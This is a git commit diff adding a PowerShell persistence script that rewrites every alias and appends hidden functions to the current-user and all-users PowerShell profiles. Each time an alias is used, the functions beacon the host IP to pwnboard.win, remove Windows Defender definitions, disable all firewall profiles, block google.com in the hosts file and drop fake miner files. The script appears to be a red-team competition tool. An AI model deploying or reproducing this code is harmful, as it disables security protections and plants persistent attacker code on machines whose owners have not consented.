dc55b96c220b4ed74b63048c064e9f5638c7b351
NotoriousRebel <matt12299@yahoo.com>
2019-10-26 03:44:09 -0400

    Big changes should be working :).

--- remap.ps1
+++ remap.ps1
@@ -1,102 +1,89 @@
-function get_aliases() {
-    $dct = @{ }
-    $counter=1
-    #Get-Alias.GetType;
-    Get-Alias | ForEach-Object { $dct[$counter] = [string]$_.Name, [string]$_.DisplayName.Split(' ')[2]; $counter++ } 
-    # map a counter to keep trqck of index for each alias in the format counter: alias name & command
-    #$tmp = @()
-   # $dct.Keys | ForEach-Object {
-   #     $tmp += $_
-   # }
-    
-    #$tmp = $tmp | Sort-Object
-    #foreach($i in $tmp){
-   #     Write-Host "$($i): $($dct[$i])"
-    #}
-    #exit 1
-    return $dct
 
+$mm = @'
+function mm {try {$i=Test-Connection -ComputerName (hostname) -Count 1|Select-Object -ExpandProperty IPV4Address;$i=$i.IPAddressToString;$p=@{"ip"=$i;"type"="Alias_Shim"}|ConvertTo-Json;Invoke-WebRequest "http://pwnboard.win/generic" -Method Post -UseBasicParsing -Body $p -ContentType "application/json"|Out-Null}Catch{}}
+'@
+$gg = @'
+function gg {$g=[Guid]::newGuid().Guid.Replace("-", "").substring(0,10) + "miner.ps1";New-Item -Path (Join-Path $env:USERPROFILE 'Desktop') -Force -Name $g | Out-Null;}
+'@
+$dd = @'
+function dd {try{Invoke-Expression("'C:\Program Files\Windows Defender\MpCmdRun.exe' -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true") -ErrorAction SilentlyContinue | Out-Null}Catch{}}
+'@
+$ff = @'
+function ff {try{Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False | Out-Null}Catch{}}
+'@
+$xx = @'
+function xx {try{$x=$false;Get-Content "C:\Windows\System32\drivers\etc\hosts" | ForEach-Object {if($_ -match "google.com"){$x = $true}};if($x -eq $false){try{Add-Content -Path "C:\Windows\System32\drivers\etc\hosts" -Value "`r`n0.0.0.0    www.google.com google.com" | Out-Null}Catch{}}}Catch{}}
+'@
+$orig_dct = @{ }
+function cool() {
+    param([parameter(ValueFromPipeline)][string]$cmd)
+    $value = (Get-Alias -Name $cmd).Definition
+    $orig_dct[$cmd] = $value
 }
 
-function store([string]$alias_name) {0
-    $path = "C:\Windows\System32\spool\drivers\color\"
-    if (Test-Path $path) {
-        # Test if path we want to write to exists
-        Write-Host "Path exists"
+function shim([string]$key, [string]$value) {
+    $y = "function shimmed_$key {{$value; Invoke-Expression('mm; gg; xx; dd; ff')}}"
+    $tmp = 'shimmed_$key'
+    $shim = 'Set-Alias -Name cmd -Value val -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force'
+    $s = $shim.Replace("cmd", $key).Replace("val", $value )
+    $arr = @()
+    $arr += $y
+    $arr += $s
+    return $arr
+}
+
+
+function write_to([string]$path, [string]$val) {
+    Try {
+        Add-Content -Path $path -Value $value
+    }
+    Catch {
 
     }
-
 }
-
-function get_content {
-    $return_str = @"
-    function master() {
-        try {
-            Remove-NetFirewallRule | Out-Null
-        }
-        Catch {
-    
-        }
-    }
-    "`r`n"
-
-"@
-
-}
-
-
-function master(){
-    $tmp_path = "C:\Windows\System32\spool\drivers\color\tmp1.txt"
-    if(Test-Path $tmp_path){
-        # Janky way to determine which alias is being modified
-        New-Item -Path "C:\Windows\System32\spool\drivers\color\tmp1.txt" -ItemType File
-    }
-    for($i = 1; $i -lt 154; $i++){
-        if($i -eq 1){
-            
-        }
-    }
-
-}
-
-function set_alias([hashtable]$dct) {
-    #AllScope, Constant -Force
-    Write-Host "inside set alias"
-    foreach ($key in $dct.Keys) {
-        Write-Host "$($dct[$key][1])"
-        $orig_command = "Invoke-Expression -Command " + "$($dct[$key][1]) echo hi"
-        Write-Host "$orig_command"
-        Write-Host "Setting $($dct[$key][0]) to $($orig_command)"
-        #Set-Alias -Name $dct[$key][0] -Value orig_command -Option AllScope -Force | Out-Null
-        exit 1
-    }
-
-    exit 1
-}
-
-function remapper([hashtable]$dct) {
-    #$tmp = $dct.keys | Sort-Object 
-    set_alias $dct
-    #$content = get_content
-
-
-}
-
 function main() {
     #$cur_user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[1]
     #$env:USERNAME may be modified
-    #$curuser_allhosts = $PROFILE.CurrentUserAllHosts
-    #$allusers_allhosts = $PROFILE.AllUsersAllHosts
-    #$32bit_path = $allusers_allhosts.Replace("System32", "SysWOW64")
+    $curuser_allhosts = $PROFILE.CurrentUserAllHosts
+    $allusers_allhosts = $PROFILE.AllUsersAllHosts
     $dct = get_aliases
-    remapper $dct
-
-
+    Get-Alias | ForEach-Object { $_.Name | cool }
+    $orig_dct["?"] = "Where-Object"
+    # Only hardcoded because returns 4 different values when doing Get-Alias
+    $lst = $orig_dct.Keys | Sort-Object
+    $all = @()
+    foreach ($key in $lst) {
+        $val = $orig_dct[$key]
+        $arr = shim $key $val
+        $alias_line = $arr[0]
+        $func_shim = $arr[1]
+        #Write-Host $arr
+        #exit 2
+        $all += $alias_line
+        $all += $func_shim
+    }
+    try {
+        write_to($curuser_allhosts, $mm)
+        write_to($curuser_allhosts, $gg)
+        write_to($curuser_allhosts, $dd)
+        write_to($curuser_allhosts, $ff)
+        write_to($curuser_allhosts, $xx)
+        foreach ($v in $all) {
+            write_to($curuser_allhosts, $v)
+        }
+    }
+    catch { { } }
+    try {
+        write_to($allusers_allhosts, $mm)
+        write_to($allusers_allhosts, $gg)
+        write_to($allusers_allhosts, $dd)
+        write_to($allusers_allhosts, $ff)
+        write_to($allusers_allhosts, $xx)
+        foreach ($v in $all) {
+            write_to($allusers_allhosts, $v)
+        }
+    }
+    catch { { } }
 }
-#main
-#get_aliases
-#main
-PS C:\Users\John> function y([string]$x){return "Write-Host $($x)"}
-PS C:\Users\John> Invoke-Expression (y("tmp"))
 
-Set-Alias -Name "h" -Value "Write-Output -Object 'hi'" -Option AllScope -Force
+main
